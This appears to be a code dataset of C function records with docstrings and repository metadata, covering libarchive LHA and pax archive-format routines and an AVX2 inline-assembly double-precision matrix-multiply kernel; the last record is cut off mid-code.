{"docstring": "/*\n * Release LZHUF decoder.\n */\n", "func_signal": "static void\nlzh_decode_free(struct lzh_stream *strm)", "code": "{\n\n\tif (strm->ds == NULL)\n\t\treturn;\n\tfree(strm->ds->w_buff);\n\tlzh_huffman_free(&(strm->ds->lt));\n\tlzh_huffman_free(&(strm->ds->pt));\n\tfree(strm->ds);\n\tstrm->ds = NULL;\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/* Convert an MSDOS-style date/time into Unix-style time. */\n", "func_signal": "static time_t\nlha_dos_time(const unsigned char *p)", "code": "{\n\tint msTime, msDate;\n\tstruct tm ts;\n\n\tmsTime = archive_le16dec(p);\n\tmsDate = archive_le16dec(p+2);\n\n\tmemset(&ts, 0, sizeof(ts));\n\tts.tm_year = ((msDate >> 9) & 0x7f) + 80;   /* Years since 1900. */\n\tts.tm_mon = ((msDate >> 5) & 0x0f) - 1;     /* Month number.     */\n\tts.tm_mday = msDate & 0x1f;\t\t    /* Day of month.     */\n\tts.tm_hour = (msTime >> 11) & 0x1f;\n\tts.tm_min = (msTime >> 5) & 0x3f;\n\tts.tm_sec = (msTime << 1) & 0x3e;\n\tts.tm_isdst = -1;\n\treturn (mktime(&ts));\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * GNU PAX Format 1.0 requires the special name, which pattern is:\n * <dir>/GNUSparseFile.<pid>/<original file name>\n *\n * This function is used for only Sparse file, a file type of which\n * is regular file.\n */\n", "func_signal": "static char *\nbuild_gnu_sparse_name(char *dest, const char *src)", "code": "{\n\tchar buff[64];\n\tconst char *p;\n\n\t/* Handle the null filename case. */\n\tif (src == NULL || *src == '\\0') {\n\t\tstrcpy(dest, \"GNUSparseFile/blank\");\n\t\treturn (dest);\n\t}\n\n\t/* Prune final '/' and other unwanted final elements. */\n\tp = src + strlen(src);\n\tfor (;;) {\n\t\t/* Ends in \"/\", remove the '/' */\n\t\tif (p > src && p[-1] == '/') {\n\t\t\t--p;\n\t\t\tcontinue;\n\t\t}\n\t\t/* Ends in \"/.\", remove the '.' */\n\t\tif (p > src + 1 && p[-1] == '.'\n\t\t    && p[-2] == '/') {\n\t\t\t--p;\n\t\t\tcontinue;\n\t\t}\n\t\tbreak;\n\t}\n\n#if HAVE_GETPID && 0  /* Disable this as pax attribute name. */\n\tsprintf(buff, \"GNUSparseFile.%d\", getpid());\n#else\n\t/* If the platform can't fetch the pid, don't include it. */\n\tstrcpy(buff, \"GNUSparseFile\");\n#endif\n\t/* General case: build a ustar-compatible name adding\n\t * \"/GNUSparseFile/\". */\n\tbuild_ustar_entry_name(dest, src, p - src, buff);\n\n\treturn (dest);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Set output format to 'pax' format.\n */\n", "func_signal": "int\narchive_write_set_format_pax(struct archive *_a)", "code": "{\n\tstruct archive_write *a = (struct archive_write *)_a;\n\tstruct pax *pax;\n\n\tarchive_check_magic(_a, ARCHIVE_WRITE_MAGIC,\n\t    ARCHIVE_STATE_NEW, \"archive_write_set_format_pax\");\n\n\tif (a->format_free != NULL)\n\t\t(a->format_free)(a);\n\n\tpax = (struct pax *)malloc(sizeof(*pax));\n\tif (pax == NULL) {\n\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t    \"Can't allocate pax data\");\n\t\treturn (ARCHIVE_FATAL);\n\t}\n\tmemset(pax, 0, sizeof(*pax));\n\ta->format_data = pax;\n\ta->format_name = \"pax\";\n\ta->format_options = archive_write_pax_options;\n\ta->format_write_header = archive_write_pax_header;\n\ta->format_write_data = archive_write_pax_data;\n\ta->format_close = archive_write_pax_close;\n\ta->format_free = archive_write_pax_free;\n\ta->format_finish_entry = archive_write_pax_finish_entry;\n\ta->archive.archive_format = ARCHIVE_FORMAT_TAR_PAX_INTERCHANGE;\n\ta->archive.archive_format_name = \"POSIX pax interchange\";\n\treturn (ARCHIVE_OK);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Skip a file content.\n */\n", "func_signal": "static int\narchive_read_format_lha_read_data_skip(struct archive_read *a)", "code": "{\n\tstruct lha *lha;\n\tint64_t bytes_skipped;\n\n\tlha = (struct lha *)(a->format->data);\n\n\tif (lha->entry_unconsumed) {\n\t\t/* Consume as much as the decompressor actually used. */\n\t\t__archive_read_consume(a, lha->entry_unconsumed);\n\t\tlha->entry_unconsumed = 0;\n\t}\n\n\t/* if we've already read to end of data, we're done. */\n\tif (lha->end_of_entry_cleanup)\n\t\treturn (ARCHIVE_OK);\n\n\t/*\n\t * If the length is at the beginning, we can skip the\n\t * compressed data much more quickly.\n\t */\n\tbytes_skipped = __archive_read_consume(a, lha->entry_bytes_remaining);\n\tif (bytes_skipped < 0)\n\t\treturn (ARCHIVE_FATAL);\n\n\t/* This entry is finished and done. */\n\tlha->end_of_entry_cleanup = lha->end_of_entry = 1;\n\treturn (ARCHIVE_OK);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Note: This code assumes that 'nanos' has the same sign as 'sec',\n * which implies that sec=-1, nanos=200000000 represents -1.2 seconds\n * and not -0.8 seconds.  This is a pretty pedantic point, as we're\n * unlikely to encounter many real files created before Jan 1, 1970,\n * much less ones with timestamps recorded to sub-second resolution.\n */\n", "func_signal": "static void\nadd_pax_attr_time(struct archive_string *as, const char *key,\n    int64_t sec, unsigned long nanos)", "code": "{\n\tint digit, i;\n\tchar *t;\n\t/*\n\t * Note that each byte contributes fewer than 3 base-10\n\t * digits, so this will always be big enough.\n\t */\n\tchar tmp[1 + 3*sizeof(sec) + 1 + 3*sizeof(nanos)];\n\n\ttmp[sizeof(tmp) - 1] = 0;\n\tt = tmp + sizeof(tmp) - 1;\n\n\t/* Skip trailing zeros in the fractional part. */\n\tfor (digit = 0, i = 10; i > 0 && digit == 0; i--) {\n\t\tdigit = nanos % 10;\n\t\tnanos /= 10;\n\t}\n\n\t/* Only format the fraction if it's non-zero. */\n\tif (i > 0) {\n\t\twhile (i > 0) {\n\t\t\t*--t = \"0123456789\"[digit];\n\t\t\tdigit = nanos % 10;\n\t\t\tnanos /= 10;\n\t\t\ti--;\n\t\t}\n\t\t*--t = '.';\n\t}\n\tt = format_int(t, sec);\n\n\tadd_pax_attr(as, key, t);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "// --- Begin OSX build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    mach_timebase_info_data_t timebase;\n    mach_timebase_info( &timebase );\n\n    uint64_t nsec = mach_absolute_time();\n\n    double the_time = (double) nsec * 1.0e-9 * timebase.numer / timebase.denom;\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = the_time;\n\n    return the_time - gtod_ref_time_sec;\n}", "path": "step4\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\\\n\t\"vextractf128  $1, %%ymm2,  %%xmm1           \\n\\t\" \\\n\t\"vmovlpd           %%xmm2,  (%%rcx,%%rsi,4)  \\n\\t\" \\\n\t\"vmovhpd           %%xmm2,  (%%rcx,%%r15  )  \\n\\t\" \\\n\t\"vmovlpd           %%xmm1,  (%%rcx,%%r13,2)  \\n\\t\" \\\n\t\"vmovhpd           %%xmm1,  (%%rcx,%%r10  )  \\n\\t\"*/\n", "func_signal": "void bl_dgemm_asm_8x6(\n                        int              k,\n                        double*            a,\n                        double*            b,\n                        double*            c,\n                        inc_t              ldc,\n                        aux_t*         data\n                      )", "code": "{\n\t//void*   a_next = bli_auxinfo_next_a( data );\n\t//void*   b_next = bli_auxinfo_next_b( data );\n\n    const inc_t cs_c = ldc;\n    const inc_t rs_c = 1;\n    double alpha_val = 1.0, beta_val = 1.0;\n    double *alpha, *beta;\n\n    alpha = &alpha_val;\n    beta  = &beta_val;\n\n\tdim_t   k_iter = (unsigned long long)k / 4;\n\tdim_t   k_left = (unsigned long long)k % 4;\n\n\t__asm__ volatile\n\t(\n\t\"                                            \\n\\t\"\n\t\"vzeroall                                    \\n\\t\" // zero all xmm/ymm registers.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %2, %%rax               \\n\\t\" // load address of a.\n\t\"movq                %3, %%rbx               \\n\\t\" // load address of b.\n\t//\"movq                %9, %%r15               \\n\\t\" // load address of b_next.\n\t\"                                            \\n\\t\"\n\t\"addq           $32 * 4, %%rax               \\n\\t\"\n\t\"                                            \\n\\t\" // initialize loop by pre-loading\n\t\"vmovaps           -4 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps           -3 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %6, %%rcx               \\n\\t\" // load address of c\n\t\"movq                %8, %%rdi               \\n\\t\" // load cs_c\n\t\"leaq        (,%%rdi,8), %%rdi               \\n\\t\" // cs_c *= sizeof(double)\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rdi,%%rdi,2), %%r13               \\n\\t\" // r13 = 3*cs_c;\n\t\"leaq   (%%rcx,%%r13,1), %%rdx               \\n\\t\" // rdx = c + 3*cs_c;\n\t\"prefetcht0   7 * 8(%%rcx)                   \\n\\t\" // prefetch c + 0*cs_c\n\t\"prefetcht0   7 * 8(%%rcx,%%rdi)             \\n\\t\" // prefetch c + 1*cs_c\n\t\"prefetcht0   7 * 8(%%rcx,%%rdi,2)           \\n\\t\" // prefetch c + 2*cs_c\n\t\"prefetcht0   7 * 8(%%rdx)                   \\n\\t\" // prefetch c + 3*cs_c\n\t\"prefetcht0   7 * 8(%%rdx,%%rdi)             \\n\\t\" // prefetch c + 4*cs_c\n\t\"prefetcht0   7 * 8(%%rdx,%%rdi,2)           \\n\\t\" // prefetch c + 5*cs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %0, %%rsi                         \\n\\t\" // i = k_iter;\n\t\"testq  %%rsi, %%rsi                         \\n\\t\" // check i via logical AND.\n\t\"je     .DCONSIDKLEFT                        \\n\\t\" // if i == 0, jump to code that\n\t\"                                            \\n\\t\" // contains the k_left loop.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DLOOPKITER:                                \\n\\t\" // MAIN LOOP\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 0\n\t\"prefetcht0  16 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       0 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       1 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm6    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm7    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       2 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       3 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm9    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       4 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       5 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm12   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm13   \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm15   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           -2 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps           -1 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 1\n\t\"vbroadcastsd       6 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       7 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm6    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm7    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       8 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       9 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm9    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      10 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      11 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm12   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm13   \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm15   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps            0 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps            1 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 2\n\t\"prefetcht0  20 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      12 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      13 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm6    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm7    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      14 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      15 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm9    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      16 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      17 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm12   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm13   \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm15   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps            2 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps            3 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // iteration 3\n\t\"vbroadcastsd      18 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      19 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm6    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm7    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      20 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      21 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm9    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd      22 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd      23 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm12   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm13   \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm15   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"addq           $4 * 8 * 8, %%rax            \\n\\t\" // a += 4*8 (unroll x mr)\n\t\"addq           $4 * 6 * 8, %%rbx            \\n\\t\" // b += 4*6 (unroll x nr)\n\t\"                                            \\n\\t\"\n\t\"vmovaps           -4 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps           -3 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"decq   %%rsi                                \\n\\t\" // i -= 1;\n\t\"jne    .DLOOPKITER                          \\n\\t\" // iterate again if i != 0.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCONSIDKLEFT:                              \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %1, %%rsi                         \\n\\t\" // i = k_left;\n\t\"testq  %%rsi, %%rsi                         \\n\\t\" // check i via logical AND.\n\t\"je     .DPOSTACCUM                          \\n\\t\" // if i == 0, we're done; jump to end.\n\t\"                                            \\n\\t\" // else, we prepare to enter k_left loop.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DLOOPKLEFT:                                \\n\\t\" // EDGE LOOP\n\t\"                                            \\n\\t\"\n\t\"prefetcht0  16 * 32(%%rax)                  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       0 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       1 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm4    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm5    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm6    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm7    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       2 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       3 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm8    \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm9    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm10   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm11   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vbroadcastsd       4 *  8(%%rbx), %%ymm2    \\n\\t\"\n\t\"vbroadcastsd       5 *  8(%%rbx), %%ymm3    \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm2, %%ymm12   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm2, %%ymm13   \\n\\t\"\n\t\"vfmadd231pd       %%ymm0, %%ymm3, %%ymm14   \\n\\t\"\n\t\"vfmadd231pd       %%ymm1, %%ymm3, %%ymm15   \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"addq           $1 * 8 * 8, %%rax            \\n\\t\" // a += 1*8 (unroll x mr)\n\t\"addq           $1 * 6 * 8, %%rbx            \\n\\t\" // b += 1*6 (unroll x nr)\n\t\"                                            \\n\\t\"\n\t\"vmovaps           -4 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovaps           -3 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"decq   %%rsi                                \\n\\t\" // i -= 1;\n\t\"jne    .DLOOPKLEFT                          \\n\\t\" // iterate again if i != 0.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DPOSTACCUM:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq         %4, %%rax                      \\n\\t\" // load address of alpha\n\t\"movq         %5, %%rbx                      \\n\\t\" // load address of beta \n\t\"vbroadcastsd    (%%rax), %%ymm0             \\n\\t\" // load alpha and duplicate\n\t\"vbroadcastsd    (%%rbx), %%ymm3             \\n\\t\" // load beta and duplicate\n\t\"                                            \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm4,  %%ymm4   \\n\\t\" // scale by alpha\n\t\"vmulpd           %%ymm0,  %%ymm5,  %%ymm5   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm6,  %%ymm6   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm7,  %%ymm7   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm8,  %%ymm8   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm9,  %%ymm9   \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm10, %%ymm10  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm11, %%ymm11  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm12, %%ymm12  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm13, %%ymm13  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm14, %%ymm14  \\n\\t\"\n\t\"vmulpd           %%ymm0,  %%ymm15, %%ymm15  \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %7, %%rsi               \\n\\t\" // load rs_c\n\t\"leaq        (,%%rsi,8), %%rsi               \\n\\t\" // rsi = rs_c * sizeof(double)\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rcx,%%rsi,4), %%rdx               \\n\\t\" // load address of c +  4*rs_c;\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rsi,%%rsi,2), %%r13               \\n\\t\" // r13 = 3*rs_c;\n\t//\"leaq   (%%rsi,%%rsi,4), %%r15               \\n\\t\" // r15 = 5*rs_c;\n\t//\"leaq   (%%r13,%%rsi,4), %%r10               \\n\\t\" // r10 = 7*rs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // determine if\n\t\"                                            \\n\\t\" //    c    % 32 == 0, AND\n\t\"                                            \\n\\t\" //  8*cs_c % 32 == 0, AND\n\t\"                                            \\n\\t\" //    rs_c      == 1\n\t\"                                            \\n\\t\" // ie: aligned, ldim aligned, and\n\t\"                                            \\n\\t\" // column-stored\n\t\"                                            \\n\\t\"\n\t\"cmpq       $8, %%rsi                        \\n\\t\" // set ZF if (8*rs_c) == 8.\n\t\"sete           %%bl                         \\n\\t\" // bl = ( ZF == 1 ? 1 : 0 );\n\t\"testq     $31, %%rcx                        \\n\\t\" // set ZF if c & 32 is zero.\n\t\"setz           %%bh                         \\n\\t\" // bh = ( ZF == 0 ? 1 : 0 );\n\t\"testq     $31, %%rdi                        \\n\\t\" // set ZF if (8*cs_c) & 32 is zero.\n\t\"setz           %%al                         \\n\\t\" // al = ( ZF == 0 ? 1 : 0 );\n\t\"                                            \\n\\t\" // and(bl,bh) followed by\n\t\"                                            \\n\\t\" // and(bh,al) will reveal result\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // now avoid loading C if beta == 0\n\t\"                                            \\n\\t\"\n\t\"vxorpd    %%ymm0,  %%ymm0,  %%ymm0          \\n\\t\" // set ymm0 to zero.\n\t\"vucomisd  %%xmm0,  %%xmm3                   \\n\\t\" // set ZF if beta == 0.\n\t\"je      .DBETAZERO                          \\n\\t\" // if ZF = 1, jump to beta == 0 case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // check if aligned/column-stored\n\t\"andb     %%bl, %%bh                         \\n\\t\" // set ZF if bl & bh == 1.\n\t\"andb     %%bh, %%al                         \\n\\t\" // set ZF if bh & al == 1.\n\t\"jne     .DCOLSTORED                         \\n\\t\" // jump to column storage case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DGENSTORED:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm4,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm6,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm8,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm10, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm12, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm14, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%rdx, %%rcx                      \\n\\t\" // rcx = c + 4*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm5,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm7,  